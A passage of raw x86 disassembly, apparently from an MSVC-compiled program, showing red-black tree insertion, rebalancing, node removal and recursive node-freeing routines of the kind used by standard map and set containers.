   156af:	mov    DWORD PTR [eax+0x68],0x1
   156b6:	mov    eax,DWORD PTR [esi+0x4]
   156b9:	mov    eax,DWORD PTR [eax+0x4]
   156bc:	and    DWORD PTR [eax+0x68],0x0
   156c0:	mov    eax,DWORD PTR [esi+0x4]
   156c3:	push   DWORD PTR [eax+0x4]
   156c6:	mov    ecx,edi
   156c8:	call   0x1138e
   156cd:	jmp    0x15722
   156cf:	mov    ecx,DWORD PTR [ecx]
   156d1:	cmp    DWORD PTR [ecx+0x68],edx
   156d4:	jne    0x156f3
   156d6:	mov    edx,eax
   156d8:	xor    eax,eax
   156da:	inc    eax
   156db:	mov    DWORD PTR [edx+0x68],eax
   156de:	mov    DWORD PTR [ecx+0x68],eax
   156e1:	mov    eax,DWORD PTR [esi+0x4]
   156e4:	mov    eax,DWORD PTR [eax+0x4]
   156e7:	and    DWORD PTR [eax+0x68],0x0
   156eb:	mov    eax,DWORD PTR [esi+0x4]
   156ee:	mov    esi,DWORD PTR [eax+0x4]
   156f1:	jmp    0x15722
   156f3:	cmp    esi,DWORD PTR [eax]
   156f5:	jne    0x15701
   156f7:	mov    esi,eax
   156f9:	push   esi
   156fa:	mov    ecx,edi
   156fc:	call   0x1138e
   15701:	mov    eax,DWORD PTR [esi+0x4]
   15704:	mov    DWORD PTR [eax+0x68],0x1
   1570b:	mov    eax,DWORD PTR [esi+0x4]
   1570e:	mov    eax,DWORD PTR [eax+0x4]
   15711:	and    DWORD PTR [eax+0x68],0x0
   15715:	mov    eax,DWORD PTR [esi+0x4]
   15718:	push   DWORD PTR [eax+0x4]
   1571b:	mov    ecx,edi
   1571d:	call   0x1131e
   15722:	mov    eax,DWORD PTR [edi+0x4]
   15725:	cmp    esi,DWORD PTR [eax+0x4]
   15728:	jne    0x15680
   1572e:	mov    eax,DWORD PTR [edi+0x4]
   15731:	mov    eax,DWORD PTR [eax+0x4]
   15734:	pop    edi
   15735:	mov    DWORD PTR [eax+0x68],0x1
   1573c:	mov    eax,DWORD PTR [ebp+0x8]
   1573f:	pop    esi
   15740:	mov    DWORD PTR [eax],ebx
   15742:	pop    ebx
   15743:	pop    ebp
   15744:	ret    0x10
   15747:	int3   
   15748:	int3   
   15749:	int3   
   1574a:	int3   
   1574b:	int3   
   1574c:	mov    edi,edi
   1574e:	push   ebp
   1574f:	mov    ebp,esp
   15751:	push   ebx
   15752:	push   esi
   15753:	mov    esi,DWORD PTR [ebp+0x10]
   15756:	push   edi
   15757:	push   0x0
   15759:	push   esi
   1575a:	mov    edi,ecx
   1575c:	call   0x139ec
   15761:	push   DWORD PTR [ebp+0x14]
   15764:	mov    ebx,eax
   15766:	mov    eax,ds:0x7f6d8
   1576b:	mov    DWORD PTR [ebx],eax
   1576d:	mov    eax,ds:0x7f6d8
   15772:	mov    DWORD PTR [ebx+0x8],eax
   15775:	lea    eax,[ebx+0xc]
   15778:	push   eax
   15779:	call   0x13b18
   1577e:	inc    DWORD PTR [edi+0xc]
   15781:	cmp    esi,DWORD PTR [edi+0x4]
   15784:	je     0x157ae
   15786:	mov    eax,DWORD PTR [ebp+0xc]
   15789:	cmp    eax,DWORD PTR ds:0x7f6d8
   1578f:	jne    0x157ae
   15791:	lea    eax,[esi+0xc]
   15794:	push   eax
   15795:	push   DWORD PTR [ebp+0x14]
   15798:	call   0x197e8
   1579d:	test   al,al
   1579f:	jne    0x157ae
   157a1:	mov    DWORD PTR [esi+0x8],ebx
   157a4:	mov    eax,DWORD PTR [edi+0x4]
   157a7:	cmp    esi,DWORD PTR [eax+0x8]
   157aa:	jne    0x157c8
   157ac:	jmp    0x157bd
   157ae:	mov    DWORD PTR [esi],ebx
   157b0:	mov    eax,DWORD PTR [edi+0x4]
   157b3:	cmp    esi,eax
   157b5:	jne    0x157c2
   157b7:	mov    DWORD PTR [eax+0x4],ebx
   157ba:	mov    eax,DWORD PTR [edi+0x4]
   157bd:	mov    DWORD PTR [eax+0x8],ebx
   157c0:	jmp    0x157c8
   157c2:	cmp    esi,DWORD PTR [eax]
   157c4:	jne    0x157c8
   157c6:	mov    DWORD PTR [eax],ebx
   157c8:	mov    eax,DWORD PTR [edi+0x4]
   157cb:	mov    esi,ebx
   157cd:	cmp    ebx,DWORD PTR [eax+0x4]
   157d0:	je     0x15884
   157d6:	mov    eax,DWORD PTR [esi+0x4]
   157d9:	xor    edx,edx
   157db:	cmp    DWORD PTR [eax+0x1c],edx
   157de:	jne    0x15884
   157e4:	mov    ecx,DWORD PTR [eax+0x4]
   157e7:	cmp    eax,DWORD PTR [ecx]
   157e9:	jne    0x15825
   157eb:	mov    ecx,DWORD PTR [ecx+0x8]
   157ee:	cmp    DWORD PTR [ecx+0x1c],edx
   157f1:	je     0x1582c
   157f3:	cmp    esi,DWORD PTR [eax+0x8]
   157f6:	jne    0x15802
   157f8:	mov    esi,eax
   157fa:	push   esi
   157fb:	mov    ecx,edi
   157fd:	call   0x13160
   15802:	mov    eax,DWORD PTR [esi+0x4]
   15805:	mov    DWORD PTR [eax+0x1c],0x1
   1580c:	mov    eax,DWORD PTR [esi+0x4]
   1580f:	mov    eax,DWORD PTR [eax+0x4]
   15812:	and    DWORD PTR [eax+0x1c],0x0
   15816:	mov    eax,DWORD PTR [esi+0x4]
   15819:	push   DWORD PTR [eax+0x4]
   1581c:	mov    ecx,edi
   1581e:	call   0x131ae
   15823:	jmp    0x15878
   15825:	mov    ecx,DWORD PTR [ecx]
   15827:	cmp    DWORD PTR [ecx+0x1c],edx
   1582a:	jne    0x15849
   1582c:	mov    edx,eax
   1582e:	xor    eax,eax
   15830:	inc    eax
   15831:	mov    DWORD PTR [edx+0x1c],eax
   15834:	mov    DWORD PTR [ecx+0x1c],eax
   15837:	mov    eax,DWORD PTR [esi+0x4]
   1583a:	mov    eax,DWORD PTR [eax+0x4]
   1583d:	and    DWORD PTR [eax+0x1c],0x0
   15841:	mov    eax,DWORD PTR [esi+0x4]
   15844:	mov    esi,DWORD PTR [eax+0x4]
   15847:	jmp    0x15878
   15849:	cmp    esi,DWORD PTR [eax]
   1584b:	jne    0x15857
   1584d:	mov    esi,eax
   1584f:	push   esi
   15850:	mov    ecx,edi
   15852:	call   0x131ae
   15857:	mov    eax,DWORD PTR [esi+0x4]
   1585a:	mov    DWORD PTR [eax+0x1c],0x1
   15861:	mov    eax,DWORD PTR [esi+0x4]
   15864:	mov    eax,DWORD PTR [eax+0x4]
   15867:	and    DWORD PTR [eax+0x1c],0x0
   1586b:	mov    eax,DWORD PTR [esi+0x4]
   1586e:	push   DWORD PTR [eax+0x4]
   15871:	mov    ecx,edi
   15873:	call   0x13160
   15878:	mov    eax,DWORD PTR [edi+0x4]
   1587b:	cmp    esi,DWORD PTR [eax+0x4]
   1587e:	jne    0x157d6
   15884:	mov    eax,DWORD PTR [edi+0x4]
   15887:	mov    eax,DWORD PTR [eax+0x4]
   1588a:	pop    edi
   1588b:	mov    DWORD PTR [eax+0x1c],0x1
   15892:	mov    eax,DWORD PTR [ebp+0x8]
   15895:	pop    esi
   15896:	mov    DWORD PTR [eax],ebx
   15898:	pop    ebx
   15899:	pop    ebp
   1589a:	ret    0x10
   1589d:	int3   
   1589e:	int3   
   1589f:	int3   
   158a0:	int3   
   158a1:	int3   
   158a2:	mov    edi,edi
   158a4:	push   ebp
   158a5:	mov    ebp,esp
   158a7:	push   ecx
   158a8:	push   ecx
   158a9:	push   ebx
   158aa:	push   esi
   158ab:	mov    DWORD PTR [ebp-0x4],ecx
   158ae:	push   edi
   158af:	mov    edi,DWORD PTR [ebp+0xc]
   158b2:	lea    ecx,[ebp+0xc]
   158b5:	call   0x1159c
   158ba:	mov    esi,DWORD PTR [edi]
   158bc:	mov    eax,ds:0x7f6dc
   158c1:	mov    ebx,edi
   158c3:	mov    DWORD PTR [ebp-0x8],esi
   158c6:	cmp    esi,eax
   158c8:	jne    0x158e6
   158ca:	mov    esi,DWORD PTR [edi+0x8]
   158cd:	mov    eax,DWORD PTR [ebx+0x4]
   158d0:	mov    ecx,DWORD PTR [ebp-0x4]
   158d3:	mov    DWORD PTR [esi+0x4],eax
   158d6:	mov    eax,DWORD PTR [ecx+0x4]
   158d9:	cmp    DWORD PTR [eax+0x4],edi
   158dc:	jne    0x1595b
   158de:	mov    DWORD PTR [eax+0x4],esi
   158e1:	jmp    0x15969
   158e6:	mov    ecx,DWORD PTR [edi+0x8]
   158e9:	cmp    ecx,eax
   158eb:	je     0x158cd
   158ed:	push   ecx
   158ee:	call   0x114c4
   158f3:	mov    ebx,eax
   158f5:	mov    esi,DWORD PTR [ebx+0x8]
   158f8:	cmp    ebx,edi
   158fa:	je     0x158cd
   158fc:	mov    eax,DWORD PTR [ebp-0x8]
   158ff:	mov    DWORD PTR [eax+0x4],ebx
   15902:	mov    eax,DWORD PTR [edi]
   15904:	mov    DWORD PTR [ebx],eax
   15906:	cmp    ebx,DWORD PTR [edi+0x8]
   15909:	jne    0x15910
   1590b:	mov    DWORD PTR [esi+0x4],ebx
   1590e:	jmp    0x15927
   15910:	mov    eax,DWORD PTR [ebx+0x4]
   15913:	mov    DWORD PTR [esi+0x4],eax
   15916:	mov    eax,DWORD PTR [ebx+0x4]
   15919:	mov    DWORD PTR [eax],esi
   1591b:	mov    eax,DWORD PTR [edi+0x8]
   1591e:	mov    DWORD PTR [ebx+0x8],eax
   15921:	mov    eax,DWORD PTR [edi+0x8]
   15924:	mov    DWORD PTR [eax+0x4],ebx
   15927:	mov    eax,DWORD PTR [ebp-0x4]
   1592a:	mov    eax,DWORD PTR [eax+0x4]
   1592d:	cmp    DWORD PTR [eax+0x4],edi
   15930:	jne    0x15937
   15932:	mov    DWORD PTR [eax+0x4],ebx
   15935:	jmp    0x15945
   15937:	mov    eax,DWORD PTR [edi+0x4]
   1593a:	cmp    DWORD PTR [eax],edi
   1593c:	jne    0x15942
   1593e:	mov    DWORD PTR [eax],ebx
   15940:	jmp    0x15945
   15942:	mov    DWORD PTR [eax+0x8],ebx
   15945:	mov    eax,DWORD PTR [edi+0x4]
   15948:	mov    DWORD PTR [ebx+0x4],eax
   1594b:	mov    eax,DWORD PTR [ebx+0x14]
   1594e:	mov    ecx,DWORD PTR [edi+0x14]
   15951:	mov    DWORD PTR [ebx+0x14],ecx
   15954:	mov    DWORD PTR [edi+0x14],eax
   15957:	mov    ebx,edi
   15959:	jmp    0x159bc
   1595b:	mov    eax,DWORD PTR [edi+0x4]
   1595e:	cmp    DWORD PTR [eax],edi
   15960:	jne    0x15966
   15962:	mov    DWORD PTR [eax],esi
   15964:	jmp    0x15969
   15966:	mov    DWORD PTR [eax+0x8],esi
   15969:	mov    eax,DWORD PTR [ecx+0x4]
   1596c:	mov    DWORD PTR [ebp-0x8],eax
   1596f:	cmp    DWORD PTR [eax],edi
   15971:	jne    0x15993
   15973:	mov    edx,DWORD PTR [edi+0x8]
   15976:	cmp    edx,DWORD PTR ds:0x7f6dc
   1597c:	jne    0x15985
   1597e:	mov    edx,DWORD PTR [edi+0x4]
   15981:	mov    DWORD PTR [eax],edx
   15983:	jmp    0x15993
   15985:	push   esi
   15986:	call   0x114c4
   1598b:	mov    ecx,DWORD PTR [ebp-0x8]
   1598e:	mov    DWORD PTR [ecx],eax
   15990:	mov    ecx,DWORD PTR [ebp-0x4]
   15993:	mov    eax,DWORD PTR [ecx+0x4]
   15996:	mov    DWORD PTR [ebp-0x8],eax
   15999:	cmp    DWORD PTR [eax+0x8],edi
   1599c:	jne    0x159bc
   1599e:	mov    ecx,DWORD PTR [edi]
   159a0:	cmp    ecx,DWORD PTR ds:0x7f6dc
   159a6:	jne    0x159b0
   159a8:	mov    ecx,DWORD PTR [edi+0x4]
   159ab:	mov    DWORD PTR [eax+0x8],ecx
   159ae:	jmp    0x159bc
   159b0:	push   esi
   159b1:	call   0x114a2
   159b6:	mov    ecx,DWORD PTR [ebp-0x8]
   159b9:	mov    DWORD PTR [ecx+0x8],eax
   159bc:	xor    edi,edi
   159be:	inc    edi
   159bf:	cmp    DWORD PTR [ebx+0x14],edi
   159c2:	jne    0x15ad9
   159c8:	jmp    0x15a87
   159cd:	cmp    DWORD PTR [esi+0x14],edi
   159d0:	jne    0x15ad6
   159d6:	mov    eax,DWORD PTR [esi+0x4]
   159d9:	cmp    esi,DWORD PTR [eax]
   159db:	jne    0x15a52
   159dd:	mov    eax,DWORD PTR [eax+0x8]
   159e0:	cmp    DWORD PTR [eax+0x14],0x0
   159e4:	jne    0x159fe
   159e6:	mov    DWORD PTR [eax+0x14],edi
   159e9:	mov    eax,DWORD PTR [esi+0x4]
   159ec:	and    DWORD PTR [eax+0x14],0x0
   159f0:	push   DWORD PTR [esi+0x4]
   159f3:	call   0x1323e
   159f8:	mov    eax,DWORD PTR [esi+0x4]
   159fb:	mov    eax,DWORD PTR [eax+0x8]
   159fe:	mov    ecx,DWORD PTR [eax]
   15a00:	cmp    DWORD PTR [ecx+0x14],edi
   15a03:	jne    0x15a0d
   15a05:	mov    ecx,DWORD PTR [eax+0x8]
   15a08:	cmp    DWORD PTR [ecx+0x14],edi
   15a0b:	je     0x15a80
   15a0d:	mov    ecx,DWORD PTR [eax+0x8]
   15a10:	cmp    DWORD PTR [ecx+0x14],edi
   15a13:	jne    0x15a2d
   15a15:	mov    ecx,DWORD PTR [eax]
   15a17:	mov    DWORD PTR [ecx+0x14],edi
   15a1a:	mov    ecx,DWORD PTR [ebp-0x4]
   15a1d:	and    DWORD PTR [eax+0x14],0x0
   15a21:	push   eax
   15a22:	call   0x1328c
   15a27:	mov    eax,DWORD PTR [esi+0x4]
   15a2a:	mov    eax,DWORD PTR [eax+0x8]
   15a2d:	mov    ecx,DWORD PTR [esi+0x4]
   15a30:	mov    ecx,DWORD PTR [ecx+0x14]
   15a33:	mov    DWORD PTR [eax+0x14],ecx
   15a36:	mov    ecx,DWORD PTR [esi+0x4]
   15a39:	mov    DWORD PTR [ecx+0x14],edi
   15a3c:	mov    eax,DWORD PTR [eax+0x8]
   15a3f:	mov    ecx,DWORD PTR [ebp-0x4]
   15a42:	mov    DWORD PTR [eax+0x14],edi
   15a45:	push   DWORD PTR [esi+0x4]
   15a48:	call   0x1323e
   15a4d:	jmp    0x15ad6
   15a52:	mov    eax,DWORD PTR [eax]
   15a54:	cmp    DWORD PTR [eax+0x14],0x0
   15a58:	jne    0x15a71
   15a5a:	mov    DWORD PTR [eax+0x14],edi
   15a5d:	mov    eax,DWORD PTR [esi+0x4]
   15a60:	and    DWORD PTR [eax+0x14],0x0
   15a64:	push   DWORD PTR [esi+0x4]
   15a67:	call   0x1328c
   15a6c:	mov    eax,DWORD PTR [esi+0x4]
   15a6f:	mov    eax,DWORD PTR [eax]
   15a71:	mov    ecx,DWORD PTR [eax+0x8]
   15a74:	cmp    DWORD PTR [ecx+0x14],edi
   15a77:	jne    0x15a98
   15a79:	mov    ecx,DWORD PTR [eax]
   15a7b:	cmp    DWORD PTR [ecx+0x14],edi
   15a7e:	jne    0x15a98
   15a80:	and    DWORD PTR [eax+0x14],0x0
   15a84:	mov    esi,DWORD PTR [esi+0x4]
   15a87:	mov    ecx,DWORD PTR [ebp-0x4]
   15a8a:	mov    eax,DWORD PTR [ecx+0x4]
   15a8d:	cmp    esi,DWORD PTR [eax+0x4]
   15a90:	jne    0x159cd
   15a96:	jmp    0x15ad6
   15a98:	mov    ecx,DWORD PTR [eax]
   15a9a:	cmp    DWORD PTR [ecx+0x14],edi
   15a9d:	jne    0x15ab7
   15a9f:	mov    ecx,DWORD PTR [eax+0x8]
   15aa2:	mov    DWORD PTR [ecx+0x14],edi
   15aa5:	mov    ecx,DWORD PTR [ebp-0x4]
   15aa8:	and    DWORD PTR [eax+0x14],0x0
   15aac:	push   eax
   15aad:	call   0x1323e
   15ab2:	mov    eax,DWORD PTR [esi+0x4]
   15ab5:	mov    eax,DWORD PTR [eax]
   15ab7:	mov    ecx,DWORD PTR [esi+0x4]
   15aba:	mov    ecx,DWORD PTR [ecx+0x14]
   15abd:	mov    DWORD PTR [eax+0x14],ecx
   15ac0:	mov    ecx,DWORD PTR [esi+0x4]
   15ac3:	mov    DWORD PTR [ecx+0x14],edi
   15ac6:	mov    eax,DWORD PTR [eax]
   15ac8:	mov    ecx,DWORD PTR [ebp-0x4]
   15acb:	mov    DWORD PTR [eax+0x14],edi
   15ace:	push   DWORD PTR [esi+0x4]
   15ad1:	call   0x1328c
   15ad6:	mov    DWORD PTR [esi+0x14],edi
   15ad9:	lea    eax,[ebx+0xc]
   15adc:	push   eax
   15add:	call   0x13b54
   15ae2:	push   ebx
   15ae3:	call   0x10a9a
   15ae8:	mov    eax,DWORD PTR [ebp-0x4]
   15aeb:	dec    DWORD PTR [eax+0xc]
   15aee:	mov    eax,DWORD PTR [ebp+0x8]
   15af1:	pop    ecx
   15af2:	mov    ecx,DWORD PTR [ebp+0xc]
   15af5:	pop    edi
   15af6:	pop    esi
   15af7:	mov    DWORD PTR [eax],ecx
   15af9:	pop    ebx
   15afa:	leave  
   15afb:	ret    0x8
   15afe:	int3   
   15aff:	int3   
   15b00:	int3   
   15b01:	int3   
   15b02:	int3   
   15b03:	int3   
   15b04:	mov    edi,edi
   15b06:	push   ebp
   15b07:	mov    ebp,esp
   15b09:	push   ebx
   15b0a:	push   esi
   15b0b:	push   edi
   15b0c:	mov    edi,DWORD PTR [ebp+0x8]
   15b0f:	mov    ebx,ecx
   15b11:	mov    esi,edi
   15b13:	cmp    edi,DWORD PTR ds:0x7f6dc
   15b19:	je     0x15b41
   15b1b:	push   DWORD PTR [esi+0x8]
   15b1e:	mov    ecx,ebx
   15b20:	call   0x15b04
   15b25:	mov    esi,DWORD PTR [esi]
   15b27:	lea    eax,[edi+0xc]
   15b2a:	push   eax
   15b2b:	call   0x13b54
   15b30:	push   edi
   15b31:	call   0x10a9a
   15b36:	pop    ecx
   15b37:	mov    edi,esi
   15b39:	cmp    esi,DWORD PTR ds:0x7f6dc
   15b3f:	jne    0x15b1b
   15b41:	pop    edi
   15b42:	pop    esi
   15b43:	pop    ebx
   15b44:	pop    ebp
   15b45:	ret    0x4
   15b48:	int3   
   15b49:	int3   
   15b4a:	int3   
   15b4b:	int3   
   15b4c:	int3   
   15b4d:	int3   
   15b4e:	mov    edi,edi
   15b50:	push   ebp
   15b51:	mov    ebp,esp
   15b53:	push   ebx
   15b54:	push   esi
   15b55:	mov    esi,DWORD PTR [ebp+0x10]
   15b58:	push   edi
   15b59:	push   0x0
   15b5b:	push   esi
   15b5c:	mov    edi,ecx
   15b5e:	call   0x1395c
   15b63:	push   DWORD PTR [ebp+0x14]
   15b66:	mov    ebx,eax
   15b68:	mov    eax,ds:0x7f6dc
   15b6d:	mov    DWORD PTR [ebx],eax
   15b6f:	mov    eax,ds:0x7f6dc
   15b74:	mov    DWORD PTR [ebx+0x8],eax
   15b77:	lea    eax,[ebx+0xc]
   15b7a:	push   eax
   15b7b:	call   0x13b36
   15b80:	inc    DWORD PTR [edi+0xc]
   15b83:	cmp    esi,DWORD PTR [edi+0x4]
   15b86:	je     0x15baa
   15b88:	mov    eax,DWORD PTR [ebp+0xc]
   15b8b:	cmp    eax,DWORD PTR ds:0x7f6dc
   15b91:	jne    0x15baa
   15b93:	mov    eax,DWORD PTR [ebp+0x14]
   15b96:	mov    eax,DWORD PTR [eax]
   15b98:	cmp    eax,DWORD PTR [esi+0xc]
   15b9b:	jl     0x15baa
   15b9d:	mov    DWORD PTR [esi+0x8],ebx
   15ba0:	mov    eax,DWORD PTR [edi+0x4]
   15ba3:	cmp    esi,DWORD PTR [eax+0x8]
   15ba6:	jne    0x15bc4
   15ba8:	jmp    0x15bb9
   15baa:	mov    DWORD PTR [esi],ebx
   15bac:	mov    eax,DWORD PTR [edi+0x4]
   15baf:	cmp    esi,eax
   15bb1:	jne    0x15bbe
   15bb3:	mov    DWORD PTR [eax+0x4],ebx
   15bb6:	mov    eax,DWORD PTR [edi+0x4]
   15bb9:	mov    DWORD PTR [eax+0x8],ebx
   15bbc:	jmp    0x15bc4
   15bbe:	cmp    esi,DWORD PTR [eax]
   15bc0:	jne    0x15bc4
   15bc2:	mov    DWORD PTR [eax],ebx
   15bc4:	mov    eax,DWORD PTR [edi+0x4]
   15bc7:	mov    esi,ebx
   15bc9:	cmp    ebx,DWORD PTR [eax+0x4]
   15bcc:	je     0x15c80
   15bd2:	mov    eax,DWORD PTR [esi+0x4]
   15bd5:	xor    edx,edx
   15bd7:	cmp    DWORD PTR [eax+0x14],edx
   15bda:	jne    0x15c80
   15be0:	mov    ecx,DWORD PTR [eax+0x4]
   15be3:	cmp    eax,DWORD PTR [ecx]
   15be5:	jne    0x15c21
   15be7:	mov    ecx,DWORD PTR [ecx+0x8]
   15bea:	cmp    DWORD PTR [ecx+0x14],edx
   15bed:	je     0x15c28
   15bef:	cmp    esi,DWORD PTR [eax+0x8]
   15bf2:	jne    0x15bfe
   15bf4:	mov    esi,eax
   15bf6:	push   esi
   15bf7:	mov    ecx,edi
   15bf9:	call   0x1323e
   15bfe:	mov    eax,DWORD PTR [esi+0x4]
   15c01:	mov    DWORD PTR [eax+0x14],0x1
   15c08:	mov    eax,DWORD PTR [esi+0x4]
   15c0b:	mov    eax,DWORD PTR [eax+0x4]
   15c0e:	and    DWORD PTR [eax+0x14],0x0
   15c12:	mov    eax,DWORD PTR [esi+0x4]
   15c15:	push   DWORD PTR [eax+0x4]
   15c18:	mov    ecx,edi
   15c1a:	call   0x1328c
   15c1f:	jmp    0x15c74
   15c21:	mov    ecx,DWORD PTR [ecx]
   15c23:	cmp    DWORD PTR [ecx+0x14],edx
   15c26:	jne    0x15c45
   15c28:	mov    edx,eax
   15c2a:	xor    eax,eax
   15c2c:	inc    eax
   15c2d:	mov    DWORD PTR [edx+0x14],eax
   15c30:	mov    DWORD PTR [ecx+0x14],eax
   15c33:	mov    eax,DWORD PTR [esi+0x4]
   15c36:	mov    eax,DWORD PTR [eax+0x4]
   15c39:	and    DWORD PTR [eax+0x14],0x0
   15c3d:	mov    eax,DWORD PTR [esi+0x4]
   15c40:	mov    esi,DWORD PTR [eax+0x4]
   15c43:	jmp    0x15c74
   15c45:	cmp    esi,DWORD PTR [eax]
   15c47:	jne    0x15c53
   15c49:	mov    esi,eax
   15c4b:	push   esi
   15c4c:	mov    ecx,edi
   15c4e:	call   0x1328c
   15c53:	mov    eax,DWORD PTR [esi+0x4]
   15c56:	mov    DWORD PTR [eax+0x14],0x1
   15c5d:	mov    eax,DWORD PTR [esi+0x4]
   15c60:	mov    eax,DWORD PTR [eax+0x4]
   15c63:	and    DWORD PTR [eax+0x14],0x0
   15c67:	mov    eax,DWORD PTR [esi+0x4]
   15c6a:	push   DWORD PTR [eax+0x4]
   15c6d:	mov    ecx,edi
   15c6f:	call   0x1323e
   15c74:	mov    eax,DWORD PTR [edi+0x4]
   15c77:	cmp    esi,DWORD PTR [eax+0x4]
   15c7a:	jne    0x15bd2
   15c80:	mov    eax,DWORD PTR [edi+0x4]
   15c83:	mov    eax,DWORD PTR [eax+0x4]
   15c86:	pop    edi
   15c87:	mov    DWORD PTR [eax+0x14],0x1
   15c8e:	mov    eax,DWORD PTR [ebp+0x8]
   15c91:	pop    esi
   15c92:	mov    DWORD PTR [eax],ebx
   15c94:	pop    ebx
   15c95:	pop    ebp
   15c96:	ret    0x10
   15c99:	int3   
   15c9a:	int3   
   15c9b:	int3   
   15c9c:	int3   
   15c9d:	int3   
   15c9e:	mov    edi,edi
   15ca0:	push   ebp
   15ca1:	mov    ebp,esp
   15ca3:	push   ebx
   15ca4:	push   esi
   15ca5:	mov    esi,DWORD PTR [ebp+0x10]
   15ca8:	push   edi
   15ca9:	push   0x0
   15cab:	push   esi
   15cac:	mov    edi,ecx
   15cae:	call   0x139ec
   15cb3:	push   DWORD PTR [ebp+0x14]
   15cb6:	mov    ebx,eax
   15cb8:	mov    eax,ds:0x7f6e4
   15cbd:	mov    DWORD PTR [ebx],eax
   15cbf:	mov    eax,ds:0x7f6e4
   15cc4:	mov    DWORD PTR [ebx+0x8],eax
   15cc7:	lea    eax,[ebx+0xc]
   15cca:	push   eax
   15ccb:	call   0x13b6c
   15cd0:	inc    DWORD PTR [edi+0xc]
   15cd3:	cmp    esi,DWORD PTR [edi+0x4]
   15cd6:	je     0x15d00
   15cd8:	mov    eax,DWORD PTR [ebp+0xc]
   15cdb:	cmp    eax,DWORD PTR ds:0x7f6e4
   15ce1:	jne    0x15d00
   15ce3:	lea    eax,[esi+0xc]
   15ce6:	push   eax
   15ce7:	push   DWORD PTR [ebp+0x14]
   15cea:	call   0x19818
   15cef:	test   al,al
   15cf1:	jne    0x15d00
   15cf3:	mov    DWORD PTR [esi+0x8],ebx
   15cf6:	mov    eax,DWORD PTR [edi+0x4]
   15cf9:	cmp    esi,DWORD PTR [eax+0x8]
   15cfc:	jne    0x15d1a
   15cfe:	jmp    0x15d0f
   15d00:	mov    DWORD PTR [esi],ebx
   15d02:	mov    eax,DWORD PTR [edi+0x4]
   15d05:	cmp    esi,eax
   15d07:	jne    0x15d14
   15d09:	mov    DWORD PTR [eax+0x4],ebx
   15d0c:	mov    eax,DWORD PTR [edi+0x4]
   15d0f:	mov    DWORD PTR [eax+0x8],ebx
   15d12:	jmp    0x15d1a
   15d14:	cmp    esi,DWORD PTR [eax]
   15d16:	jne    0x15d1a
   15d18:	mov    DWORD PTR [eax],ebx
   15d1a:	mov    eax,DWORD PTR [edi+0x4]
   15d1d:	mov    esi,ebx
   15d1f:	cmp    ebx,DWORD PTR [eax+0x4]
   15d22:	je     0x15dd6
   15d28:	mov    eax,DWORD PTR [esi+0x4]
   15d2b:	xor    edx,edx
   15d2d:	cmp    DWORD PTR [eax+0x1c],edx
   15d30:	jne    0x15dd6
   15d36:	mov    ecx,DWORD PTR [eax+0x4]
   15d39:	cmp    eax,DWORD PTR [ecx]
   15d3b:	jne    0x15d77
   15d3d:	mov    ecx,DWORD PTR [ecx+0x8]
   15d40:	cmp    DWORD PTR [ecx+0x1c],edx
   15d43:	je     0x15d7e
   15d45:	cmp    esi,DWORD PTR [eax+0x8]
   15d48:	jne    0x15d54
   15d4a:	mov    esi,eax
   15d4c:	push   esi
   15d4d:	mov    ecx,edi
   15d4f:	call   0x13354
   15d54:	mov    eax,DWORD PTR [esi+0x4]
   15d57:	mov    DWORD PTR [eax+0x1c],0x1
   15d5e:	mov    eax,DWORD PTR [esi+0x4]
   15d61:	mov    eax,DWORD PTR [eax+0x4]
   15d64:	and    DWORD PTR [eax+0x1c],0x0
   15d68:	mov    eax,DWORD PTR [esi+0x4]
   15d6b:	push   DWORD PTR [eax+0x4]
   15d6e:	mov    ecx,edi
   15d70:	call   0x133a2
   15d75:	jmp    0x15dca
   15d77:	mov    ecx,DWORD PTR [ecx]
   15d79:	cmp    DWORD PTR [ecx+0x1c],edx
   15d7c:	jne    0x15d9b
   15d7e:	mov    edx,eax
   15d80:	xor    eax,eax
   15d82:	inc    eax
   15d83:	mov    DWORD PTR [edx+0x1c],eax
   15d86:	mov    DWORD PTR [ecx+0x1c],eax
   15d89:	mov    eax,DWORD PTR [esi+0x4]
   15d8c:	mov    eax,DWORD PTR [eax+0x4]
   15d8f:	and    DWORD PTR [eax+0x1c],0x0
   15d93:	mov    eax,DWORD PTR [esi+0x4]
   15d96:	mov    esi,DWORD PTR [eax+0x4]
   15d99:	jmp    0x15dca
   15d9b:	cmp    esi,DWORD PTR [eax]
   15d9d:	jne    0x15da9
   15d9f:	mov    esi,eax
   15da1:	push   esi
   15da2:	mov    ecx,edi
   15da4:	call   0x133a2
   15da9:	mov    eax,DWORD PTR [esi+0x4]
   15dac:	mov    DWORD PTR [eax+0x1c],0x1
   15db3:	mov    eax,DWORD PTR [esi+0x4]
   15db6:	mov    eax,DWORD PTR [eax+0x4]
   15db9:	and    DWORD PTR [eax+0x1c],0x0
   15dbd:	mov    eax,DWORD PTR [esi+0x4]
   15dc0:	push   DWORD PTR [eax+0x4]
   15dc3:	mov    ecx,edi
   15dc5:	call   0x13354
   15dca:	mov    eax,DWORD PTR [edi+0x4]
   15dcd:	cmp    esi,DWORD PTR [eax+0x4]
   15dd0:	jne    0x15d28
   15dd6:	mov    eax,DWORD PTR [edi+0x4]
   15dd9:	mov    eax,DWORD PTR [eax+0x4]
   15ddc:	pop    edi
   15ddd:	mov    DWORD PTR [eax+0x1c],0x1
   15de4:	mov    eax,DWORD PTR [ebp+0x8]
   15de7:	pop    esi
   15de8:	mov    DWORD PTR [eax],ebx
   15dea:	pop    ebx
   15deb:	pop    ebp
   15dec:	ret    0x10
   15def:	int3   
   15df0:	int3   
   15df1:	int3   
   15df2:	int3   
   15df3:	int3   
   15df4:	mov    edi,edi
   15df6:	push   ebp
   15df7:	mov    ebp,esp
   15df9:	push   ecx
   15dfa:	push   DWORD PTR [ebp-0x4]
   15dfd:	push   DWORD PTR [ebp+0x10]
   15e00:	push   DWORD PTR [ebp+0xc]
   15e03:	push   DWORD PTR [ebp+0x8]
   15e06:	call   0x14bc4
   15e0b:	add    esp,0x10
   15e0e:	leave  
   15e0f:	ret    
   15e10:	int3   
   15e11:	int3   
   15e12:	int3   
   15e13:	int3   
   15e14:	int3   
   15e15:	int3   
   15e16:	mov    edi,edi
   15e18:	push   ebp
   15e19:	mov    ebp,esp
   15e1b:	push   esi
   15e1c:	push   edi
   15e1d:	mov    edi,DWORD PTR [ebp+0x8]
   15e20:	mov    al,BYTE PTR [edi+0x8]
   15e23:	mov    esi,ecx
   15e25:	mov    BYTE PTR [esi+0x8],al
   15e28:	call   0x144f0
   15e2d:	push   edi
   15e2e:	mov    ecx,esi
   15e30:	call   0x14b62
   15e35:	pop    edi
   15e36:	mov    eax,esi
   15e38:	pop    esi
   15e39:	pop    ebp
